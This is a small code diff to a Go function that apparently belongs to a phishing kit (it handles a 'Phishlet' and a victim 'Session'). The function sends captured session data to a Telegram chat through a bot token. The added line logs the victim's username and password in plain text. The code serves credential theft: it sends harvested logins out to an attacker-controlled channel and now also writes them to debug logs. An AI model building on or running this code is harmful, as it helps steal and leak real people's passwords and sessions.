@@ -110,6 +110,8 @@ func SendTelegramNotification(cfg *Config, s *Session, p *Phishlet) {
 		msg = msg[:747] + "..."
 	}
 
+	log.Debug("[TELEGRAM] Sending notification for session %s. Username: %s, Password: %s (MsgID: %d)", s.Id, username, password, s.TelegramMessageID)
+
 	if s.TelegramMessageID == 0 {
 		// First time sending - create new message
 		msgID := sendToTelegram(cfg.telegramConfig.Token, cfg.telegramConfig.ChatId, msg, buf.Bytes())
